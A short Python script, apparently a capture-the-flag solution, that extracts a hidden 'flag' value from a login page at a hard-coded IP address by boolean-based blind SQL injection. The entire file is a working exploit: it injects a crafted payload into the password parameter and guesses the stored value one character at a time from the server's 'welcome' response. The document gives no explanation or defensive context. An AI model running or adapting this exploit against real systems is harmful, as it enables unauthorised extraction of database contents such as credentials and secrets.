import requests
import urllib.parse

URL = "http://103.197.184.163:12113"
FLAG = ""
MAX_LEN = 50 

for pos in range(1, MAX_LEN):
    found = False
    for c in range(32, 127):  # Các ký tự ASCII in được
        raw_payload = f"'||(ord(mid((select(flag)from(flag)),{pos},1))={c})||'"
        payload = urllib.parse.quote_plus(raw_payload, safe='%')
        full_url = f"{URL}?user=admin&pass={payload}"

        r = requests.get(full_url)
        resp = r.text.strip()

        if resp == "welcome \\o/":
            FLAG += chr(c)
            print(f"[+] Found char {pos} is: {chr(c)}")
            found = True
            break

    if not found:
        print(f"[!] Stopped at position {pos}")
        break

print(f"\nFLAG is: {FLAG}")
